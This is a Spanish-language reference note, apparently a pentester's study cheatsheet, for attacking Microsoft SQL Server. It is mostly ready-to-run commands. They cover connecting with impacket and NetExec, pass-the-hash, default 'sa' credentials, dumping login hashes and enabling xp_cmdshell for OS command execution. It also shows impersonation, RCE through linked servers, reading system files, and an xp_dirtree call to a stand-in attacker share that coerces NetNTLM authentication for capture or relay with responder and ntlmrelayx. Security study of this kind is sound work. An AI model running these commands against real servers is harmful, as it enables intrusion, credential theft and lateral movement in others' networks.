---
tipo: meta
aliases:
  - MSSQL - matriz
  - mssql cheatsheet
  - SQL Server - matriz
tags:
  - meta/referencia
  - dominio/red
---

# MSSQL - matriz de referencia

> [!info] Referencia pura, no un zettel
> **Puertos: 1433/tcp** (SQL Server) y **1434/udp** (SQL Browser, resuelve instancias con nombre). Ataque del **servicio** Microsoft SQL Server: conectar, enumerar, `xp_cmdshell` a RCE, impersonar, saltar por linked servers y capturar/relayear NetNTLM. Inyección SQL web: [[MOC - SQL injection]]. Muy ligado a AD por la autenticación Windows. Criterio de recon en [[MOC - Reconocimiento de red]].

`HOST`, `u`, `p`, `DOM` son marcadores. La herramienta de cabecera es `impacket-mssqlclient`.

## Conectar

| Caso | Comando |
|---|---|
| Auth SQL | `impacket-mssqlclient u:p@HOST` |
| Auth Windows (NTLM) | `impacket-mssqlclient DOM/u:p@HOST -windows-auth` |
| Pass-the-hash | `impacket-mssqlclient DOM/u@HOST -hashes :NT -windows-auth` |
| Kerberos | `impacket-mssqlclient -k HOST` |
| Cliente nativo Linux | `sqsh -S HOST -U u -P p` · `sqlcmd -S HOST -U u -P p` |
| NetExec, auth de dominio | `nxc mssql HOST -u u -p p -d DOM` |
| NetExec, dominio actual/local | `nxc mssql HOST -u u -p p -d .` |
| NetExec, auth SQL local | `nxc mssql HOST -u u -p p --local-auth` |

Credenciales por defecto que valen probar: `sa:(vacía)`, `sa:sa`, `sa:Password123`.

`nxc mssql` no solo autentica: corre queries con `-q 'SELECT @@version'` y comandos del SO con `-x 'whoami'` (habilita `xp_cmdshell` por vos). Ideal para validar acceso y ejecutar en masa sin abrir sesión.

## Reconocimiento

| Comando | Qué da |
|---|---|
| `nmap -sV --script "ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info,ms-sql-config" -p1433 HOST` | Versión, cuentas sin contraseña, info NTLM (nombre de host/dominio) |

`ms-sql-ntlm-info` saca el dominio y el hostname sin autenticarse — útil aun sin credenciales.

## Enumerar (dentro de la sesión)

| Tarea | SQL |
|---|---|
| Versión / usuario | `SELECT @@version;` · `SELECT system_user;` |
| ¿Soy sysadmin? | `SELECT is_srvrolemember('sysadmin');` |
| Bases | `SELECT name FROM sys.databases;` |
| Hashes de logins | `SELECT name, password_hash FROM sys.sql_logins;` |
| Linked servers | `SELECT srvname FROM master..sysservers;` |
| Quién puedo impersonar | `SELECT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id WHERE a.permission_name='IMPERSONATE';` |

## RCE por `xp_cmdshell`

La vía directa a comandos del SO. Requiere sysadmin (o impersonarlo).

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

En `impacket-mssqlclient` hay atajos: `enable_xp_cmdshell` y luego `xp_cmdshell whoami`.

## Escalar — impersonación y linked servers

| Técnica | SQL |
|---|---|
| Impersonar un login | `EXECUTE AS LOGIN = 'sa'; SELECT system_user;` |
| Ejecutar en un linked server | `EXEC ('SELECT @@version') AT [LINKED];` |
| RCE en el linked (si `rpc out`) | `EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [LINKED];` |

Los linked servers suelen correr con más privilegio en el destino que el que tenés en el origen — cadena de escalada/lateral clásica de SQL Server.

## Capturar / relayear NetNTLM

Forzar al servicio a autenticarse contra vos: sale el hash NetNTLMv2 de la **cuenta de servicio** de SQL.

| Tarea | SQL / comando |
|---|---|
| Forzar la autenticación | `EXEC master..xp_dirtree '\\ATACANTE\share';` (o `xp_fileexist`) |
| Del lado atacante | `responder -I tun0` para capturar, o `ntlmrelayx` para reenviar |

El hash capturado se crackea, o se reenvía con [[Relay de NTLM]] si el destino no exige firma.

## Leer archivos

| Tarea | SQL |
|---|---|
| Leer un archivo | `SELECT * FROM OPENROWSET(BULK N'C:\Windows\win.ini', SINGLE_CLOB) AS x;` |
| Listar un directorio | `EXEC master..xp_dirtree 'C:\', 1, 1;` |

## Errores frecuentes

| Síntoma | Causa | Salida |
|---|---|---|
| `Login failed for user` | credencial o modo de auth equivocado | probar `-windows-auth`, defaults, o hash |
| `xp_cmdshell` deshabilitado | no está prendido | la secuencia `sp_configure` de arriba (requiere sysadmin) |
| `EXECUTE AS` rechazado | sin permiso `IMPERSONATE` | enumerar a quién sí podés impersonar |
| instancia con nombre no conecta | no sabés el puerto dinámico | consultar el SQL Browser 1434/udp (`nmap -sU -p1434`) |
